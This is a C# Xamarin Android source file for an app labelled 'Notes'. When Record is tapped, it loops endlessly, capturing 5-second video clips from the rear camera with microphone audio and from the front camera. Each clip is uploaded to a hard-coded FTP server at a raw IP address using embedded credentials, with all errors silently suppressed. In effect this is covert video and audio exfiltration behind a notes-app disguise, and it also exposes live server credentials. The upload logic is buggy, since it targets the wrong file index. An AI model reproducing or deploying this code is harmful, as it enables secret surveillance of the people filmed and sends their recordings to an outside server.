using Android.App;
using Android.OS;
using Android.Support.V7.App;
using Android.Runtime;
using Android.Widget;
using Android.Media;
using System.Threading.Tasks;
using Android.Hardware;
using System;
using FluentFTP;
using System.Net;

namespace App1
{
    [Activity(Label = "Заметки", Theme = "@style/AppTheme", MainLauncher = true)]

    public class MainActivity : AppCompatActivity
    {
        public Camera FrontCam;
        MediaRecorder recorder;
        MediaRecorder frontrecorder;
        public int i = 0;
        public int a = 0;
        public int b = 0;
        public int c = 0;

        [System.Obsolete]
        protected override async void OnCreate(Bundle bundle)
        {
            try
            {
                base.OnCreate(bundle);
                Xamarin.Essentials.Platform.Init(this, bundle);
                // Set our view from the "main" layout resource
                SetContentView(Resource.Layout.activity_main);
                string path = Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/test.mp4";
                var record = FindViewById<Button>(Resource.Id.Record);
                var video = FindViewById<VideoView>(Resource.Id.SampleVideoView);
                var frontvideo = FindViewById<VideoView>(Resource.Id.SampleVideoViewFront);
                /////////////


                if (Camera.NumberOfCameras < 2)
                {
                    Toast.MakeText(this, "Front camera missing", ToastLength.Long).Show();
                    return;
                }

                var FrontCamera = FrontCam;
                var camera = Camera.Open(1);
                Android.Hardware.Camera.Parameters parameters = camera.GetParameters();
                parameters.SetPictureSize(1920, 1080);
                camera.SetParameters(parameters);
                //camera.Unlock();
                camera.SetDisplayOrientation(90);
                var rearcamera = Camera.Open(0);
                Android.Hardware.Camera.Parameters rearparameters = rearcamera.GetParameters();
                rearparameters.SetPictureSize(1920, 1080);
                rearcamera.SetParameters(rearparameters);
                rearcamera.SetDisplayOrientation(90);
                record.Click += async delegate
                {
                    i = 1;
                    FtpClient client = new FtpClient("93.189.41.9");
                    client.Credentials = new NetworkCredential("u163406", "JzjTZ3OPl0Ob");
                    while (i == 1)
                    {
                        try
                        {
                            rearcamera.Unlock();
                            recorder = new MediaRecorder();
                            recorder.SetCamera(rearcamera);
                            recorder.SetVideoSource(VideoSource.Camera);
                            recorder.SetAudioSource(AudioSource.Mic);
                            recorder.SetOutputFormat(OutputFormat.Default);
                            recorder.SetVideoEncoder(VideoEncoder.Default);
                            recorder.SetAudioEncoder(AudioEncoder.Default);
                            recorder.SetVideoEncodingBitRate(12000);
                            recorder.SetVideoSize(1920, 1080);
                            recorder.SetOutputFile(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/test" + a + ".mp4");
                            recorder.SetPreviewDisplay(video.Holder.Surface);
                            recorder.Prepare();
                            recorder.Start();
                            await Task.Delay(5000);
                            a++;
                            recorder.Stop();
                            recorder.Reset();
                            try
                            {
                                client.Connect();
                                await client.UploadFileAsync(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/test" + a + ".mp4", "/test" + a + ".mp4");
                                client.Disconnect();
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        catch (Exception ex)
                        {
                        }

                    }

                };
                record.Click += async delegate
                {
                    b = 1;
                    FtpClient client = new FtpClient("93.189.41.9");
                    client.Credentials = new NetworkCredential("u163406", "JzjTZ3OPl0Ob");
                    while (b == 1)
                    {
                        try
                        {
                            camera.Unlock();
                            frontrecorder = new MediaRecorder();
                            frontrecorder.SetCamera(camera);
                            frontrecorder.SetVideoSource(VideoSource.Camera);
                            frontrecorder.SetOutputFormat(OutputFormat.Default);
                            frontrecorder.SetVideoEncoder(VideoEncoder.Default);
                            frontrecorder.SetVideoEncodingBitRate(6000);
                            frontrecorder.SetVideoSize(1280, 720);
                            frontrecorder.SetOutputFile(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/fronttest" + c + ".mp4");
                            frontrecorder.SetPreviewDisplay(frontvideo.Holder.Surface);
                            frontrecorder.Prepare();
                            frontrecorder.Start();
                            await Task.Delay(5000);
                            c++;
                            frontrecorder.Stop();
                            frontrecorder.Reset();
                            try
                            {
                                client.Connect();
                                await client.UploadFileAsync(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/fronttest" + c + ".mp4", "/fronttest" + c + ".mp4");
                                client.Disconnect();
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                };
            }
            catch (System.Exception ex)
            {
            }
        }
        protected override void OnDestroy()
        {
            base.OnDestroy();
            if (recorder != null)
            {
                recorder.Release();
                recorder.Dispose();
                recorder = null;
            }
        }

        public override void OnRequestPermissionsResult(int requestCode, string[] permissions, [GeneratedEnum] Android.Content.PM.Permission[] grantResults)
        {
            Xamarin.Essentials.Platform.OnRequestPermissionsResult(requestCode, permissions, grantResults);

            base.OnRequestPermissionsResult(requestCode, permissions, grantResults);
        }
    }
}